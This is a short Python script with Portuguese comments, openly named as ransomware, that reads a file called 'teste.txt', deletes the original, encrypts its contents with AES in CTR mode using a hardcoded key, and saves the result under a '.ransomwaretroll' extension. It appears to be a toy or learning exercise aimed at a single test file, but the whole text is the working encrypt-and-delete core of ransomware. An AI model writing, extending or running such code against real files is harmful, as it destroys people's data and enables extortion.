import os
import pyaes

# abre o arquivo a ser criptografado
arq_nome = "teste.txt"
arq = open(arq_nome, "rb")
arq_data = arq.read()
arq.close()

# remove o arquivo
os.remove(arq_nome)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografa o arquivo
dados_encriptados = aes.encrypt(arq_data)

# salva o arquivo criptografado
arq_novo = arq_nome + ".ransomwaretroll"
arq_novo = open(f'{arq_novo}','wb')
arq_novo.write(dados_encriptados)
arq_novo.close()
